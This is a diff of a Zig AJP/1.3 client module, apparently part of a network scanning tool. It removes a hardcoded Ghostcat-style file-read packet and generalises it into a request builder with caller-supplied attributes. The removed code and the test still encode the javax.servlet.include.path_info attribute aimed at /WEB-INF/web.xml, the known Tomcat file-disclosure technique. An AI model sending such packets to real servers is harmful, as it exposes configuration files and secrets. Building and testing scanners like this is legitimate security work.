@@ -1,8 +1,9 @@
-//! Minimal AJP/1.3 FORWARD_REQUEST client for Ghostcat-style reads.
+//! Minimal AJP/1.3 request client.
 //!
-//! The packet is built from the same framing the research reproduction uses: the type
-//! precedes the 2-byte body length, AJP strings carry their NUL in the length, and the
-//! include attributes are sent as request attributes.
+//! This is a protocol transport, not a CVE implementation: callers supply the method, URI
+//! and arbitrary request attributes. AJP strings are length-prefixed by their character
+//! count (the trailing NUL is not included), and the response frames are parsed back into
+//! a status and body.
 
 const std = @import("std");
 const tcp_scan = @import("tcp_scan.zig");
@@ -14,6 +15,18 @@ const max_frame_bytes = 64 * 1024;
 pub const Response = struct {
     status: u16,
     body: []u8,
+};
+
+pub const Attribute = struct {
+    name: []const u8,
+    value: []const u8,
+};
+
+pub const Request = struct {
+    method: []const u8 = "GET",
+    uri: []const u8 = "/",
+    server_port: u16 = 8080,
+    attributes: []const Attribute = &.{},
 };
 
 fn parseTarget(text: []const u8) !struct { host: []const u8, port: u16 } {
@@ -34,22 +47,43 @@ fn appendString(body: *std.ArrayList(u8), a: std.mem.Allocator, value: []const u
     try body.append(a, 0);
 }
 
-fn buildPacket(a: std.mem.Allocator, host: []const u8, include_path: []const u8) ![]u8 {
+fn methodCode(method: []const u8) !u8 {
+    const pairs = [_]struct { text: []const u8, code: u8 }{
+        .{ .text = "OPTIONS", .code = 1 },
+        .{ .text = "GET", .code = 2 },
+        .{ .text = "HEAD", .code = 3 },
+        .{ .text = "POST", .code = 4 },
+        .{ .text = "PUT", .code = 5 },
+        .{ .text = "DELETE", .code = 6 },
+        .{ .text = "TRACE", .code = 7 },
+        .{ .text = "PROPFIND", .code = 8 },
+        .{ .text = "PROPPATCH", .code = 9 },
+        .{ .text = "MKCOL", .code = 10 },
+        .{ .text = "COPY", .code = 11 },
+        .{ .text = "MOVE", .code = 12 },
+        .{ .text = "LOCK", .code = 13 },
+        .{ .text = "UNLOCK", .code = 14 },
+    };
+    for (pairs) |pair| {
+        if (std.ascii.eqlIgnoreCase(method, pair.text)) return pair.code;
+    }
+    return error.InvalidAipMethod;
+}
+
+fn buildPacket(a: std.mem.Allocator, host: []const u8, request: Request) ![]u8 {
+    if (request.attributes.len > 64) return error.TooManyAipAttributes;
     var body: std.ArrayList(u8) = .empty;
     errdefer body.deinit(a);
-    try body.appendSlice(a, &.{ 0x02, 0x02 });
+    try body.appendSlice(a, &.{ 0x02, try methodCode(request.method) });
     try appendString(&body, a, "HTTP/1.1");
-    try appendString(&body, a, "/");
+    try appendString(&body, a, request.uri);
     try appendString(&body, a, host);
     try appendString(&body, a, "localhost");
     try appendString(&body, a, "localhost");
-    try body.appendSlice(a, &.{ 0x1F, 0x90, 0x00, 0x00, 0x00 });
-    const attributes = [_]struct { name: []const u8, value: []const u8 }{
-        .{ .name = "javax.servlet.include.request_uri", .value = "/" },
-        .{ .name = "javax.servlet.include.path_info", .value = include_path },
-        .{ .name = "javax.servlet.include.servlet_path", .value = "/" },
-    };
-    for (attributes) |attribute| {
+    try body.append(a, @intCast(request.server_port >> 8));
+    try body.append(a, @intCast(request.server_port & 0xff));
+    try body.appendSlice(a, &.{ 0x00, 0x00, 0x00 });
+    for (request.attributes) |attribute| {
         try body.append(a, 0x0A);
         try appendString(&body, a, attribute.name);
         try appendString(&body, a, attribute.value);
@@ -102,14 +136,14 @@ pub fn exchange(
     allocator: std.mem.Allocator,
     io: std.Io,
     target_text: []const u8,
-    include_path: []const u8,
+    request: Request,
     timeout_ms: u32,
     stop_check: ?stop.Check,
 ) !Response {
-    if (include_path.len == 0 or include_path.len > 4096) return error.InvalidAipPath;
+    if (request.uri.len == 0 or request.uri.len > 4096) return error.InvalidAipPath;
     if (timeout_ms < 50 or timeout_ms > 10000) return error.InvalidTimeout;
     const target = try parseTarget(target_text);
-    const packet = try buildPacket(allocator, target.host, include_path);
+    const packet = try buildPacket(allocator, target.host, request);
     defer allocator.free(packet);
     const deadline = std.Io.Clock.Timestamp.fromNow(io, .{
         .raw = std.Io.Duration.fromMilliseconds(timeout_ms),
@@ -160,13 +194,23 @@ pub fn exchange(
     return .{ .status = status, .body = try body.toOwnedSlice(allocator) };
 }
 
-test "AJP forward request encodes the include attribute" {
-    const packet = try buildPacket(std.testing.allocator, "127.0.0.1", "/WEB-INF/web.xml");
+test "AJP request encodes arbitrary attributes" {
+    const attributes = [_]Attribute{
+        .{ .name = "javax.servlet.include.path_info", .value = "/WEB-INF/web.xml" },
+        .{ .name = "custom.one", .value = "value" },
+    };
+    const packet = try buildPacket(std.testing.allocator, "127.0.0.1", .{
+        .method = "GET",
+        .uri = "/",
+        .server_port = 8080,
+        .attributes = &attributes,
+    });
     defer std.testing.allocator.free(packet);
     try std.testing.expectEqual(@as(u8, 0x12), packet[0]);
     try std.testing.expectEqual(@as(u8, 0x34), packet[1]);
     try std.testing.expectEqual(@as(usize, packet.len - 4), (@as(usize, packet[2]) << 8) | packet[3]);
     try std.testing.expect(std.mem.indexOf(u8, packet, "javax.servlet.include.path_info") != null);
     try std.testing.expect(std.mem.indexOf(u8, packet, "/WEB-INF/web.xml") != null);
+    try std.testing.expect(std.mem.indexOf(u8, packet, "custom.one") != null);
     try std.testing.expectEqual(@as(u8, 0xFF), packet[packet.len - 1]);
 }
